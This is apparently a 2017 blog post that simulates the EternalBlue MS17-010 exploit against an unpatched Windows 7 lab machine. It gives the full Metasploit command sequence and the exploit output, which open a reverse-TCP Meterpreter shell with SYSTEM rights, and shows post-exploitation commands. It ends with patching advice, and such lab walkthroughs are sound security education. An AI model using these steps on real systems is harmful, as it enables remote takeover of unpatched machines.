---
title: Simulating EternalBlue Exploit Used by WannaCry Attack
date: 2017-05-17 15:00:00 -0600
---

On May 12 2017, a ransomware called WannaCry attacked the Internet across multiple
countries, causing serious damages to some companies, hospitals, and government
agencies.

The WannaCry used a vulnerability in Windows operating system to infect target
machines. The attack method that exploits vulnerability was disclosed in April
and named as "EternalBlue". The vulnerability was discovered in Microsoft's Server
Message Block(SMB) running on port 445, normally used for file sharing between
machines in the network.

Although Microsoft found the vulnerability earlier and release a security patch
to fix the problem in security bulletin MS17-010 in March, 2017, there were still
a lot of machines not patched till May. This gave the WannaCry an excellent
opportunity to infect machines worldwide.

In this post, I am going to simulate an EternalBlue exploitation against a
vulnerable Windows 7 virtual machine using Kali Linux and Metasploit Framework.

First, create a virtual machine running Windows 7. DO NOT INSTALL NEW WINDOWS UPDATES.

![updates](/images/win7_02.png)

*(No new updates installed)*

Then, share a folder. The Windows Firewall will enable the rule to allow inbound
communication through port 445.
<!--excerpt-->

![firewall](/images/win7_01.png)

*(Port 445 is allowed in Windows Firewall inbound rules)*

At this point, this machine has already become a vulnerable target of EternalBlue.
The scanning result given by Nessus and OpenVAS confirmed this.

![nessus](/images/win7_03.png)

*(Nessus scanning result)*

![openvas](/images/win7_04.PNG)

*(OpenVAS scanning result)*

Now we are ready to perform the exploit. Start Kali Linux. Here I am using version
2017.1.

Once Kali Linux has started, open a terminal, run `msfupdate` to update Metasploit.
Then use the following command to start Metasploit Framework:

```nohighlight
msfconsole
```

![metasploit](/images/win7_05.png)

*(Starting Metasploit)*

Once Metasploit has started, we can check if there is an existing module to exploit
EternalBlue, or MS17-010. Use the following command to search in current modules:

```nonhighlight
search ms17-010
```

*(When this post was written, there was no such module in the official database.
So I had to find one on the Internet. But the EternalBlue module was added to 
the database later. Thus, you should be able to find it directly after running
msfupdate and this part was edited.)*

The search result is:

```nohighlight
Matching Modules
================

   Name                                      Disclosure Date  Rank    Description
   ----                                      ---------------  ----    -----------
   auxiliary/scanner/smb/smb_ms17_010                         normal  MS17-010 SMB RCE Detection
   exploit/windows/smb/ms17_010_eternalblue  2017-03-14       good    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
```

The second result is the one we need. Run `info exploit/windows/smb/ms17_010_eternalblue`
to view detailed description.

To choose the module, run the "use" command:

```nohighlight
msf > use exploit/windows/smb/ms17_010_eternalblue 
msf exploit(ms17_010_eternalblue) > 
```

After choosing the module, use "show options" command:

```nohighlight
msf exploit(ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   GroomAllocations    12               yes       Initial number of times to groom the kernel pool.
   GroomDelta          5                yes       The amount to increase the groom count by per try.
   MaxExploitAttempts  3                yes       The number of times to retry the exploit.
   ProcessName         spoolsv.exe      yes       Process to inject payload into.
   RHOST                                yes       The target address
   RPORT               445              yes       The target port (TCP)
   VerifyArch          true             yes       Check if remote architecture matches exploit Target.
   VerifyTarget        true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

From the output, we know that the target address(RHOST) has not been set. Since
the address of target VM is 192.168.1.210, run:

```noghighlight
msf exploit(ms17_010_eternalblue) > set RHOST 192.168.1.210
RHOST => 192.168.1.210
```

To perform the exploit, Metasploit also needs a payload. The complete list of payloads
can be found by using command `show payloads`. If no payload is designated, a
default payload will be used. Here, I will manually set a payload:

```nohighlight
msf exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
```

The Meterpreter in reverse tcp is a very powerful tool during an exploitation.
After setting the payload, run `show options` again, the result will become:

```nohighlight
msf exploit(ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   GroomAllocations    12               yes       Initial number of times to groom the kernel pool.
   GroomDelta          5                yes       The amount to increase the groom count by per try.
   MaxExploitAttempts  3                yes       The number of times to retry the exploit.
   ProcessName         spoolsv.exe      yes       Process to inject payload into.
   RHOST               192.168.1.210    yes       The target address
   RPORT               445              yes       The target port (TCP)
   VerifyArch          true             yes       Check if remote architecture matches exploit Target.
   VerifyTarget        true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

Here we just need one more step: set the LHOST address so that the reverse tcp
Meterpreter will connect back to this address. Here I just set it as the machine
running Kali Linux:

```nohighlight
msf exploit(ms17_010_eternalblue) > set LHOST 192.168.1.220
LHOST => 192.168.1.220
```

Now, we are all ready. Start the exploit!

```nohighlight
msf exploit(ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 192.168.1.220:4444 
[*] 192.168.1.210:445 - Connecting to target for exploitation.
[+] 192.168.1.210:445 - Connection established for exploitation.
[+] 192.168.1.210:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.1.210:445 - CORE raw buffer dump (27 bytes)
[*] 192.168.1.210:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 192.168.1.210:445 - 0x00000010  73 69 6f 6e 61 6c 20 36 2e 31 00                 sional 6.1     
[+] 192.168.1.210:445 - Target arch selected valid for OS indicated by DCE/RPC reply
[*] 192.168.1.210:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.1.210:445 - Sending all but last fragment of exploit packet
[*] 192.168.1.210:445 - Starting non-paged pool grooming
[+] 192.168.1.210:445 - Sending SMBv2 buffers
[+] 192.168.1.210:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.1.210:445 - Sending final SMBv2 buffers.
[*] 192.168.1.210:445 - Sending last fragment of exploit packet!
[*] 192.168.1.210:445 - Receiving response from exploit packet
[+] 192.168.1.210:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.1.210:445 - Sending egg to corrupted connection.
[*] 192.168.1.210:445 - Triggering free of corrupted buffer.
[*] Sending stage (1189423 bytes) to 192.168.1.210
[*] Meterpreter session 1 opened (192.168.1.220:4444 -> 192.168.1.210:49158) at 2017-06-05 01:55:11 -0400
[+] 192.168.1.210:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.210:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.210:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter >
```

The exploit is now successfully conducted. The Meterpreter has established a
connection between target machine and attacking machine. Next we can use Meterpreter
as a powerful shell and perform many useful(dangerous) actions, for example:

```nohighlight
meterpreter > pwd
C:\Windows\system32
```

```nohighlight
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

```nohighlight
meterpreter > ps

Process List
============

 PID   PPID  Name                     Arch  Session  User                          Path
 ---   ----  ----                     ----  -------  ----                          ----
 0     0     [System Process]                                                      
 4     0     System                   x64   0                                      
 272   4     smss.exe                 x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 328   500   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  
 356   344   csrss.exe                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 396   388   csrss.exe                x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
...
```

From the result given by `getuid`, we know that Meterpreter is running as SYSTEM,
which is the lowest level of Windows and has highest privilege. This perfectly
shows how dangerous the EternalBlue exploit can be if employed by malicious hackers.

With the exploit, we can also read, download or edit files stored on target machine.
We can also upload files or programs to it - just like how WannaCry ransomware got
into the system.

To end the simulation, run `exit` command:

```nohighlight
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 192.168.1.210 - Meterpreter session 1 closed.  Reason: User exit
msf exploit(ms17_010_eternalblue) > 
```

### Summary

This is a simple simulation of an attack using EternalBlue exploit. It illustrates
how easy the MS17-010 vulnerability can be exploited and how dangerous it could
be. To prevent such kind of attack, apply latest security patches from vendors and
regularly scan system for known vulnerabilities.

### Reference

[Microsoft Security Bulletin MS17-010](https://technet.microsoft.com/en-us/library/security/ms17-010.aspx)

[MS17-010 EternalBlue SMB Metasploit Module](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue)
